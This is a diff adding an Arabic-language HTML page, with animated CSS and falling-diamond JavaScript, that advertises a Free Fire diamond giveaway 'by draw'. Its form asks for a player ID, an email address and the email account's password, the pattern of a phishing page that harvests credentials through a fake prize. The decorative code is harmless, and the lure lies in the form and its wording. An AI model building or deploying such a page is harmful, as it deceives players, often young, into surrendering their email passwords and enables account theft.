@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Free Fire Diamonds</title>
+
+    <style>
+* {
+    box-sizing: border-box;
+}
+
+html, body {
+    margin: 0;
+    width: 100%;
+    min-height: 100%;
+}
+
+body {
+    font-family: Arial, sans-serif;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    overflow: hidden;
+    position: relative;
+
+    /* خلفية Free Fire الجديدة */
+    background-image:
+        linear-gradient(
+            rgba(0, 0, 0, 0.22),
+            rgba(0, 0, 0, 0.22)
+        ),
+        url("a_dramatic_high_detail_cinematic_free_fire_styl.png");
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    background-attachment: fixed;
+}
+
+/* الضوء الذي يتبع الماوس */
+body::before {
+    content: "";
+    position: absolute;
+    width: 420px;
+    height: 420px;
+    border-radius: 50%;
+
+    background: radial-gradient(
+        circle,
+        rgba(255, 110, 0, 0.22) 0%,
+        rgba(255, 60, 0, 0.08) 35%,
+        transparent 70%
+    );
+
+    left: var(--mouse-x, 50%);
+    top: var(--mouse-y, 50%);
+
+    transform: translate(-50%, -50%);
+    pointer-events: none;
+
+    transition:
+        left 0.15s ease-out,
+        top 0.15s ease-out;
+
+    filter: blur(8px);
+}
+
+/* شبكة Gaming خفيفة */
+body::after {
+    content: "";
+    position: absolute;
+    inset: 0;
+
+    background-image:
+        linear-gradient(
+            rgba(255, 120, 0, 0.035) 1px,
+            transparent 1px
+        ),
+        linear-gradient(
+            90deg,
+            rgba(255, 120, 0, 0.035) 1px,
+            transparent 1px
+        );
+
+    background-size: 45px 45px;
+
+    mask-image: linear-gradient(
+        to bottom,
+        transparent,
+        black 20%,
+        black 80%,
+        transparent
+    );
+
+    pointer-events: none;
+}
+
+/* جزيئات Free Fire */
+.box::after {
+    content: "✦  •  ✦  •  ✦";
+    position: absolute;
+    left: -180px;
+    top: -100px;
+
+    color: rgba(255, 140, 0, 0.18);
+    font-size: 45px;
+    letter-spacing: 25px;
+
+    transform: rotate(-25deg);
+
+    animation: particles 8s linear infinite;
+    pointer-events: none;
+}
+
+/* الصندوق */
+.box {
+    position: relative;
+    z-index: 5;
+
+    background:
+        linear-gradient(
+            145deg,
+            rgba(30, 30, 30, 0.94),
+            rgba(8, 8, 8, 0.94)
+        );
+
+    width: 350px;
+    padding: 30px;
+
+    border-radius: 18px;
+
+    border: 1px solid rgba(255, 140, 0, 0.45);
+
+    text-align: center;
+
+    box-shadow:
+        0 0 20px rgba(255, 90, 0, 0.20),
+        0 0 60px rgba(255, 60, 0, 0.08),
+        inset 0 0 30px rgba(255, 120, 0, 0.04);
+
+    backdrop-filter: blur(15px);
+
+    animation: boxIn 0.9s cubic-bezier(.17,.67,.35,1.2);
+}
+
+/* الخط المضيء */
+.box::before {
+    content: "";
+
+    position: absolute;
+    top: 0;
+    left: 10%;
+
+    width: 80%;
+    height: 3px;
+
+    background: linear-gradient(
+        90deg,
+        transparent,
+        #ff9800,
+        #ff3d00,
+        #ff9800,
+        transparent
+    );
+
+    box-shadow:
+        0 0 10px #ff6d00,
+        0 0 25px #ff4500;
+
+    animation: lineGlow 2s infinite;
+}
+
+/* الشعار */
+.logo {
+    font-size: 30px;
+    font-weight: bold;
+
+    margin-bottom: 15px;
+
+    color: white;
+
+    text-shadow:
+        0 0 5px white,
+        0 0 12px #ff9800,
+        0 0 25px #ff4500;
+
+    animation: logoPulse 2s ease-in-out infinite;
+}
+
+h1 {
+    color: white;
+    font-size: 23px;
+    margin-bottom: 8px;
+
+    text-shadow:
+        0 0 10px rgba(255, 120, 0, 0.4);
+}
+
+p {
+    color: #aaa;
+}
+
+/* الحقول */
+input {
+    width: 100%;
+    box-sizing: border-box;
+
+    padding: 14px;
+    margin: 9px 0;
+
+    border-radius: 9px;
+
+    border: 1px solid rgba(255,255,255,0.12);
+
+    background: rgba(255,255,255,0.055);
+
+    color: white;
+
+    font-size: 15px;
+
+    outline: none;
+
+    transition:
+        0.3s ease;
+}
+
+input::placeholder {
+    color: #888;
+}
+
+input:hover {
+    border-color: rgba(255,140,0,0.35);
+}
+
+input:focus {
+    border-color: #ff9800;
+
+    background: rgba(255,120,0,0.08);
+
+    box-shadow:
+        0 0 10px rgba(255,120,0,0.35),
+        inset 0 0 10px rgba(255,120,0,0.05);
+
+    transform: translateY(-2px);
+}
+
+/* الزر */
+button {
+    position: relative;
+    overflow: hidden;
+
+    width: 100%;
+
+    padding: 14px;
+    margin-top: 14px;
+
+    border: none;
+    border-radius: 9px;
+
+    background:
+        linear-gradient(
+            135deg,
+            #ffb300,
+            #ff7200,
+            #ff3d00
+        );
+
+    color: white;
+
+    font-size: 17px;
+    font-weight: bold;
+
+    cursor: pointer;
+
+    box-shadow:
+        0 5px 20px rgba(255,80,0,0.35);
+
+    transition:
+        0.25s ease;
+}
+
+/* لمعان متحرك */
+button::before {
+    content: "";
+
+    position: absolute;
+
+    top: 0;
+    left: -120%;
+
+    width: 60%;
+    height: 100%;
+
+    background:
+        linear-gradient(
+            90deg,
+            transparent,
+            rgba(255,255,255,0.5),
+            transparent
+        );
+
+    transform: skewX(-25deg);
+
+    transition: 0.6s;
+}
+
+button:hover {
+    transform: translateY(-3px) scale(1.02);
+
+    box-shadow:
+        0 8px 30px rgba(255,80,0,0.55),
+        0 0 20px rgba(255,130,0,0.3);
+}
+
+button:hover::before {
+    left: 140%;
+}
+
+button:active {
+    transform: scale(0.96);
+}
+
+.warning {
+    font-size: 12px;
+    margin-top: 20px;
+    color: #777;
+}
+
+/* =========================
+   ANIMATIONS
+========================= */
+
+@keyframes boxIn {
+    from {
+        opacity: 0;
+        transform: translateY(50px) scale(0.9);
+    }
+
+    to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+    }
+}
+
+@keyframes logoPulse {
+    0%, 100% {
+        transform: scale(1);
+    }
+
+    50% {
+        transform: scale(1.04);
+    }
+}
+
+@keyframes lineGlow {
+    0%, 100% {
+        opacity: 0.5;
+    }
+
+    50% {
+        opacity: 1;
+        filter: brightness(1.5);
+    }
+}
+
+@keyframes particles {
+    0% {
+        transform:
+            translate(-100px, 50px)
+            rotate(-25deg);
+        opacity: 0;
+    }
+
+    30% {
+        opacity: 1;
+    }
+
+    70% {
+        opacity: 0.7;
+    }
+
+    100% {
+        transform:
+            translate(500px, 250px)
+            rotate(-25deg);
+        opacity: 0;
+    }
+}
+
+/* الهاتف */
+@media (max-width: 480px) {
+    .box {
+        width: calc(100% - 30px);
+        padding: 25px 20px;
+    }
+
+    .logo {
+        font-size: 27px;
+    }
+
+    h1 {
+        font-size: 20px;
+    }
+}
+</style>
+
+<script>
+const diamondSymbols = ["💎", "💎", "💠"];
+
+function createDiamond() {
+    const diamond = document.createElement("div");
+
+    diamond.innerHTML =
+        diamondSymbols[Math.floor(Math.random() * diamondSymbols.length)];
+
+    diamond.style.position = "fixed";
+    diamond.style.top = "-50px";
+    diamond.style.left = Math.random() * 100 + "vw";
+    diamond.style.zIndex = "1";
+    diamond.style.pointerEvents = "none";
+
+    const size = 14 + Math.random() * 20;
+    diamond.style.fontSize = size + "px";
+
+    diamond.style.filter =
+        "drop-shadow(0 0 5px #00c8ff) " +
+        "drop-shadow(0 0 12px #008cff)";
+
+    diamond.style.opacity = 0.45 + Math.random() * 0.55;
+
+    const duration = 4 + Math.random() * 5;
+
+    diamond.style.animation =
+        `diamondFall ${duration}s linear forwards`;
+
+    document.body.appendChild(diamond);
+
+    setTimeout(() => {
+        diamond.remove();
+    }, duration * 1000);
+}
+
+const style = document.createElement("style");
+
+style.textContent = `
+@keyframes diamondFall {
+
+    0% {
+        transform:
+            translateY(-60px)
+            rotate(0deg)
+            translateX(0);
+        opacity: 0;
+    }
+
+    10% {
+        opacity: 1;
+    }
+
+    50% {
+        transform:
+            translateY(50vh)
+            rotate(180deg)
+            translateX(30px);
+    }
+
+    100% {
+        transform:
+            translateY(115vh)
+            rotate(360deg)
+            translateX(-40px);
+        opacity: 0;
+    }
+}
+`;
+
+document.head.appendChild(style);
+
+/* سقوط الجواهر باستمرار */
+setInterval(createDiamond, 350);
+
+/* دفعة أولى */
+for (let i = 0; i < 12; i++) {
+    setTimeout(createDiamond, i * 180);
+}
+</script>
+</head>
+
+<body>
+
+    <div class="box">
+
+        <div class="logo">💎 Free Fire</div>
+
+        <h1> ربح جواهر فري فاير بالقرعة</h1>
+
+        <p>ادخل معلوماتك و فز الان</p>
+
+        <form action="page 2.html" method="get">
+
+            <input
+                type="text"
+                placeholder="معرّف اللاعب (Player ID)"
+                required
+            >
+
+            <input
+                type="email"
+                placeholder="adresse email "
+                min="1"
+                required
+            >
+            <input
+                type="password"
+                placeholder="كلمة سر البريد الالكتروني "
+                min="1"
+                required
+            >
+
+            <button type="submit">
+                تسجيل  
+            </button>
+
+        </form>
+    </div>
+
+</body>
+</html>
